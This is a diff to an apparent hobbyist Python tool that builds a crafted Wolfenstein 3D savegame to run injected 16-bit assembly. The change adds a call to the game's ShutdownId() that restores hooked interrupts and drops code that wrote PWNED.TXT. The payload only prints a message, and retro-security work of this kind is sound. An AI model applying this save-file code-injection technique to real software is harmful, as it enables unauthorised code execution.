@@ -40,6 +40,9 @@ VERSION_DEFAULTS = {
     "retail": {
         "ext": ".WL6",
         "dgroup_rel": 0x398D,
+        # ShutdownId() sits at LOAD+0x54B:0x0009 -> DS-0x3442:0x0009.
+        "shutdown_delta": 0x3442,
+        "shutdown_off": 0x0009,
         "objlist_off": DEFAULT_OBJLIST_OFF,
         "tilemap_off": DEFAULT_TILEMAP_OFF,
     },
@@ -49,6 +52,9 @@ VERSION_DEFAULTS = {
         # LZEXE 0.91 unpack stub and reading the C0.ASM `mov dx, DGROUP` immediate
         # (load 0x1000 -> 0x4783); see HURDLES.md / SHAREWARE.md.
         "dgroup_rel": 0x3783,
+        # ShutdownId() sits at LOAD+0x50B:0x000A -> DS-0x3278:0x000A.
+        "shutdown_delta": 0x3278,
+        "shutdown_off": 0x000A,
         # Shareware BSS/DGROUP-relative offsets (retail equivalents 0xB51C / 0x75BA).
         # objlist is confirmed from the save's own actorat near pointers; tilemap by
         # matching code immediates against the retail build.
@@ -228,38 +234,39 @@ def payload_text(save: bytearray, dgroup: int, args: argparse.Namespace) -> None
     # Escape for NASM db string: keep printable ASCII/simple escapes; fall back to bytes.
     safe = text.encode("latin-1", errors="replace")
     hex_bytes = ",".join(f"0x{b:02X}" for b in safe)
-    msg_len = len(safe)
     asm = f"""bits 16
 org 0x{args.tilemap_off:04X}
 start:
     push cs
     pop ds
+    ; Restore the vectors the game hooked -- INT 08h (timer), INT 09h (keyboard)
+    ; and the sound IRQ -- by calling the game's own ShutdownId().  Without this
+    ; the game's keyboard ISR swallows every keypress (so INT 16h hangs forever)
+    ; and the timer ISR faults once DOS frees the game's memory on exit.
+    mov ax, ds
+    sub ax, 0x{args.shutdown_delta:04X}
+    push cs
+    push word .shutdown
+    push ax
+    push strict word 0x{args.shutdown_off:04X}
+    retf
+.shutdown:
+    push cs
+    pop ds
+    sti
     mov ax, 0x0003
     int 0x10
     mov si, msg
 .print:
     lodsb
     test al, al
-    jz .done
+    jz .prompt
     mov ah, 0x0E
     mov bh, 0x00
     mov bl, 0x07
     int 0x10
     jmp .print
-.done:
-    ; write the message to PWNED.TXT next to the game
-    mov dx, fname
-    xor cx, cx
-    mov ah, 0x3C
-    int 0x21
-    jc .wait
-    mov bx, ax
-    mov dx, msg
-    mov cx, {msg_len}
-    mov ah, 0x40
-    int 0x21
-    mov ah, 0x3E
-    int 0x21
+.prompt:
     mov si, nl
 .nl:
     lodsb
@@ -276,7 +283,6 @@ start:
     mov ax, 0x4C00
     int 0x21
 msg: db {hex_bytes}, 0
-fname: db "PWNED.TXT", 0
 nl: db 0x0D, 0x0A, "(press any key to exit)", 0x0D, 0x0A, 0
 """
     payload = assemble_bytes(asm, args.nasm, "text_payload")
@@ -329,6 +335,8 @@ def build(args: argparse.Namespace) -> Path:
 
     args.objlist_off = args.objlist_off if args.objlist_off is not None else defaults["objlist_off"]
     args.tilemap_off = args.tilemap_off if args.tilemap_off is not None else defaults["tilemap_off"]
+    args.shutdown_delta = defaults["shutdown_delta"]
+    args.shutdown_off = defaults["shutdown_off"]
 
     # Savegame header: 32-byte name field (null-padded). Checksum does not cover header.
     name = args.name if args.name is not None else PAYLOAD_NAMES[args.payload]
